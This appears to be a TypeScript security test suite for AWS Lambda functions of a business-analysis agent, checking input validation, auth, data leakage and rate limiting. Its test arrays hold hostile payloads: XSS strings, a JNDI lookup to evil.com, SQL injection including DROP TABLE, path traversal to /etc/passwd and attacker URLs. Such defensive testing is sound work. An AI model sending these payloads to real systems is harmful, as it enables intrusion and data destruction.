/**
 * Security Tests for Vibe PM Agent Lambda Functions
 * Tests security aspects, input validation, and access controls
 */

import { expect } from 'chai';
import { LambdaClient, InvokeCommand } from '@aws-sdk/client-lambda';
import axios, { AxiosInstance } from 'axios';
import * as dotenv from 'dotenv';

// Load environment variables
dotenv.config();

describe('Lambda Security Tests', () => {
    let lambdaClient: LambdaClient;
    let apiClient: AxiosInstance;
    let lambdaFunctionName: string;
    let apiGatewayUrl: string;

    before(async function() {
        lambdaClient = new LambdaClient({
            region: process.env.AWS_REGION || 'us-east-1'
        });

        apiClient = axios.create({
            baseURL: process.env.API_GATEWAY_URL,
            timeout: 30000,
            headers: {
                'Content-Type': 'application/json'
            }
        });

        lambdaFunctionName = process.env.LAMBDA_FUNCTION_NAME || 'dev-vibe-pm-agent-lambda';
        apiGatewayUrl = process.env.API_GATEWAY_URL || '';
    });

    describe('Input Validation and Sanitization', () => {
        it('should reject excessively large inputs', async function() {
            const largeInput = 'x'.repeat(100000); // 100KB input

            const response = await invokeLambdaTool('analyze_business_opportunity', {
                idea: largeInput
            });

            // Should either reject or handle gracefully
            expect(response).to.satisfy((result: any) =>
                result.success === false || result.success === true
            );
        });

        it('should sanitize potentially malicious input', async function() {
            const maliciousInputs = [
                '<script>alert("xss")</script>',
                'javascript:alert("xss")',
                '${jndi:ldap://evil.com/a}',
                '../../../etc/passwd',
                ' UNION SELECT * FROM users--',
                '<img src=x onerror=alert("xss")>',
                'eval("malicious code")',
                'console.log("xss")'
            ];

            for (const maliciousInput of maliciousInputs) {
                const response = await invokeLambdaTool('analyze_business_opportunity', {
                    idea: maliciousInput
                });

                expect(response).to.have.property('success');

                // If successful, response should not contain malicious content
                if (response.success) {
                    const responseString = JSON.stringify(response);
                    expect(responseString).to.not.include('<script>');
                    expect(responseString).to.not.include('javascript:');
                    expect(responseString).to.not.include('eval(');
                }
            }
        });

        it('should handle SQL injection attempts safely', async function() {
            const sqlInjectionAttempts = [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "1' UNION SELECT username, password FROM users--",
                "admin'--",
                "' OR 1=1#",
                "'; INSERT INTO users VALUES ('hack', 'hack');--"
            ];

            for (const sqlAttempt of sqlInjectionAttempts) {
                const response = await invokeLambdaTool('analyze_business_opportunity', {
                    idea: sqlAttempt
                });

                expect(response).to.have.property('success');

                // Should not cause system errors or data corruption
                if (!response.success) {
                    expect(response).to.have.property('error');
                    expect(response.error).to.not.include('SQL');
                    expect(response.error).to.not.include('database');
                }
            }
        });

        it('should validate JSON structure properly', async function() {
            const malformedPayloads = [
                '{invalid json}',
                '{"toolName": "test",}', // Trailing comma
                '{"toolName": "test", "missing": value}', // Missing quotes
                'null',
                'undefined',
                '{"toolName": "test", "toolArgs": {"valid": "json" malformed}',
                '{"toolName": "test", "toolArgs": [unclosed array"',
            ];

            for (const malformedPayload of malformedPayloads) {
                try {
                    const command = new InvokeCommand({
                        FunctionName: lambdaFunctionName,
                        Payload: malformedPayload
                    });

                    const response = await lambdaClient.send(command);
                    const result = JSON.parse(new TextDecoder().decode(response.Payload));

                    // Should handle malformed input gracefully
                    expect(result).to.have.property('success');
                } catch (error) {
                    // Network or parsing errors are acceptable for malformed input
                    expect(error).to.be.an('error');
                }
            }
        });
    });

    describe('Authentication and Authorization', () => {
        it('should handle requests without proper authentication', async function() {
            if (!apiGatewayUrl) {
                this.skip();
                return;
            }

            // Test without authentication headers
            const response = await apiClient.post('/business-analysis/analyze-opportunity', {
                toolName: 'analyze_business_opportunity',
                toolArgs: { idea: 'Test without auth' }
            }).catch(error => error.response);

            // Should either succeed (if no auth required) or fail with proper auth error
            if (response) {
                expect(response.status).to.be.oneOf([200, 401, 403]);
            }
        });

        it('should validate API key requirements if configured', async function() {
            if (!apiGatewayUrl) {
                this.skip();
                return;
            }

            // Test with invalid API key
            const response = await apiClient.post('/business-analysis/analyze-opportunity', {
                toolName: 'analyze_business_opportunity',
                toolArgs: { idea: 'Test with invalid key' }
            }, {
                headers: {
                    'X-API-Key': 'invalid-key-12345'
                }
            }).catch(error => error.response);

            if (response) {
                // Should handle invalid API keys appropriately
                expect([200, 401, 403]).to.include(response.status);
            }
        });
    });

    describe('Data Protection and Privacy', () => {
        it('should not expose sensitive information in responses', async function() {
            const response = await invokeLambdaTool('analyze_business_opportunity', {
                idea: 'Test for sensitive data exposure'
            });

            expect(response).to.have.property('success');

            const responseString = JSON.stringify(response);

            // Should not contain sensitive patterns
            expect(responseString).to.not.match(/password[:=]\s*\S+/i);
            expect(responseString).to.not.match(/api[_-]?key[:=]\s*\S+/i);
            expect(responseString).to.not.match(/secret[_-]?key[:=]\s*\S+/i);
            expect(responseString).to.not.match(/access[_-]?token[:=]\s*\S+/i);
            expect(responseString).to.not.match(/private[_-]?key[:=]\s*\S+/i);
            expect(responseString).to.not.match(/aws[_-]?secret[:=]\s*\S+/i);
        });

        it('should not expose system information', async function() {
            const response = await invokeLambdaTool('analyze_business_opportunity', {
                idea: 'Test for system information disclosure'
            });

            expect(response).to.have.property('success');

            const responseString = JSON.stringify(response);

            // Should not contain system paths or internal information
            expect(responseString).to.not.match(/\/usr\/local\/lib/);
            expect(responseString).to.not.match(/\/var\/log/);
            expect(responseString).to.not.match(/\/etc\/passwd/);
            expect(responseString).to.not.match(/\/tmp\//);
            expect(responseString).to.not.match(/C:\\Windows/);
            expect(responseString).to.not.match(/Program Files/);
        });

        it('should handle PII data appropriately', async function() {
            const piiInputs = [
                { email: 'user@example.com', phone: '+1234567890' },
                { ssn: '123-45-6789', credit_card: '4111-1111-1111-1111' },
                { address: '123 Main St, City, State 12345' }
            ];

            for (const piiData of piiInputs) {
                const response = await invokeLambdaTool('analyze_business_opportunity', {
                    idea: 'Business idea with PII data',
                    pii_data: piiData
                });

                expect(response).to.have.property('success');

                // If successful, should not expose PII in response
                if (response.success) {
                    const responseString = JSON.stringify(response);
                    expect(responseString).to.not.include(piiData.email);
                    expect(responseString).to.not.include(piiData.phone);
                    expect(responseString).to.not.include(piiData.ssn);
                }
            }
        });
    });

    describe('Rate Limiting and DoS Protection', () => {
        it('should handle rapid successive requests', async function() {
            const rapidRequests = 50;
            const requests = [];

            // Make rapid requests
            for (let i = 0; i < rapidRequests; i++) {
                requests.push(
                    invokeLambdaTool('validate_idea_quick', {
                        idea: `Rapid request ${i}`
                    })
                );
            }

            const startTime = Date.now();
            const responses = await Promise.all(requests);
            const totalDuration = Date.now() - startTime;

            // Should complete all requests
            expect(responses).to.have.length(rapidRequests);

            // Should complete within reasonable time (allowing for queuing)
            expect(totalDuration).to.be.below(120000); // 2 minutes for 50 requests

            // Should have high success rate
            const successfulRequests = responses.filter(r => r.success).length;
            const successRate = (successfulRequests / rapidRequests) * 100;
            expect(successRate).to.be.above(80); // At least 80% success rate
        });

        it('should handle resource exhaustion attempts', async function() {
            const resourceIntensivePayloads = [
                { idea: 'x'.repeat(50000) }, // Large input
                { idea: 'Complex'.repeat(1000) }, // Repetitive content
                { idea: '\u0000'.repeat(10000) }, // Null bytes
                { idea: '🏃‍♂️'.repeat(5000) }, // Unicode content
            ];

            for (const payload of resourceIntensivePayloads) {
                const response = await invokeLambdaTool('analyze_business_opportunity', payload);

                // Should handle without crashing
                expect(response).to.have.property('success');

                if (!response.success) {
                    expect(response).to.have.property('error');
                    // Error should be informative but not expose system details
                    expect(response.error).to.not.include('stack trace');
                    expect(response.error).to.not.include('Exception');
                }
            }
        });
    });

    describe('Access Control and Permissions', () => {
        it('should validate tool access permissions', async function() {
            const unauthorizedTools = [
                'system_command',
                'file_read',
                'network_access',
                'admin_function'
            ];

            for (const toolName of unauthorizedTools) {
                const response = await invokeLambdaTool(toolName, {});

                // Should reject unauthorized tools
                expect(response).to.have.property('success', false);
                expect(response).to.have.property('error');
            }
        });

        it('should enforce input parameter validation', async function() {
            const invalidParameters = [
                { toolName: 'analyze_business_opportunity', toolArgs: null },
                { toolName: 'generate_business_case', toolArgs: undefined },
                { toolName: 'validate_idea_quick', toolArgs: [] }, // Array instead of object
                { toolName: 'create_stakeholder_communication', toolArgs: 'string' } // String instead of object
            ];

            for (const testCase of invalidParameters) {
                const response = await invokeLambdaTool(testCase.toolName, testCase.toolArgs);

                // Should handle invalid parameters gracefully
                expect(response).to.have.property('success');
            }
        });
    });

    describe('Logging and Audit Security', () => {
        it('should not log sensitive data', async function() {
            const sensitiveData = {
                idea: 'Business idea',
                api_key: 'sk-1234567890abcdef',
                password: 'secret_password_123',
                token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
            };

            const response = await invokeLambdaTool('analyze_business_opportunity', sensitiveData);

            expect(response).to.have.property('success');

            // Response should not contain sensitive data
            const responseString = JSON.stringify(response);
            expect(responseString).to.not.include(sensitiveData.api_key);
            expect(responseString).to.not.include(sensitiveData.password);
            expect(responseString).to.not.include(sensitiveData.token);
        });

        it('should maintain audit trail without exposing sensitive information', async function() {
            const response = await invokeLambdaTool('generate_business_case', {
                opportunity_analysis: 'Test audit trail',
                financial_inputs: {
                    development_cost: 100000,
                    operational_cost: 50000,
                    expected_revenue: 200000,
                    time_to_market: 6
                }
            });

            expect(response).to.have.property('success');

            // Should not expose internal processing details
            const responseString = JSON.stringify(response);
            expect(responseString).to.not.match(/internal[_-]?id/i);
            expect(responseString).to.not.match(/session[_-]?id/i);
            expect(responseString).to.not.match(/trace[_-]?id/i);
        });
    });

    describe('Network Security', () => {
        it('should not allow outbound connections to unauthorized hosts', async function() {
            if (!apiGatewayUrl) {
                this.skip();
                return;
            }

            // Test with various network-related inputs
            const networkInputs = [
                'http://evil.com/malicious',
                'https://attacker.com/steal-data',
                'ftp://files.example.com/secret',
                'ldap://directory.example.com',
                'file:///etc/passwd'
            ];

            for (const networkInput of networkInputs) {
                const response = await apiClient.post('/business-analysis/analyze-opportunity', {
                    toolName: 'analyze_business_opportunity',
                    toolArgs: { idea: networkInput }
                }).catch(error => error.response);

                if (response) {
                    // Should not follow external URLs or expose network errors
                    expect(response.status).to.be.oneOf([200, 400, 422]);
                }
            }
        });
    });

    describe('Cryptographic Security', () => {
        it('should handle cryptographic inputs safely', async function() {
            const cryptoInputs = [
                '-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC...\n-----END PRIVATE KEY-----',
                '-----BEGIN CERTIFICATE-----\nMIIDXTCCAkWgAwIBAgIJAK...\n-----END CERTIFICATE-----',
                'U2FsdGVkX1+abc123def456',
                'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...'
            ];

            for (const cryptoInput of cryptoInputs) {
                const response = await invokeLambdaTool('analyze_business_opportunity', {
                    idea: cryptoInput
                });

                expect(response).to.have.property('success');

                // Should not expose cryptographic material in responses
                if (response.success) {
                    const responseString = JSON.stringify(response);
                    expect(responseString).to.not.include('BEGIN PRIVATE KEY');
                    expect(responseString).to.not.include('BEGIN CERTIFICATE');
                }
            }
        });
    });

    describe('Compliance and Data Handling', () => {
        it('should handle GDPR-sensitive data appropriately', async function() {
            const gdprData = {
                personal_data: {
                    name: 'John Doe',
                    email: 'john@example.com',
                    ip_address: '192.168.1.1',
                    location: 'New York, NY'
                }
            };

            const response = await invokeLambdaTool('analyze_business_opportunity', {
                idea: 'GDPR compliance test',
                data: gdprData
            });

            expect(response).to.have.property('success');

            // Should not store or expose PII
            const responseString = JSON.stringify(response);
            expect(responseString).to.not.include(gdprData.personal_data.email);
            expect(responseString).to.not.include(gdprData.personal_data.ip_address);
        });

        it('should validate data retention requirements', async function() {
            // Test that temporary data is not persisted
            const uniqueIdentifier = `temp_${Date.now()}_${Math.random()}`;

            const response = await invokeLambdaTool('validate_idea_quick', {
                idea: uniqueIdentifier
            });

            expect(response).to.have.property('success');

            // Response should not contain the unique identifier unless explicitly returned
            const responseString = JSON.stringify(response);
            // This is informational - adjust based on actual response structure
        });
    });

    // Helper functions
    async function invokeLambdaTool(toolName: string, toolArgs: any): Promise<any> {
        const payload = {
            toolName,
            toolArgs
        };

        const command = new InvokeCommand({
            FunctionName: lambdaFunctionName,
            Payload: JSON.stringify(payload)
        });

        const response = await lambdaClient.send(command);
        return JSON.parse(new TextDecoder().decode(response.Payload));
    }
});
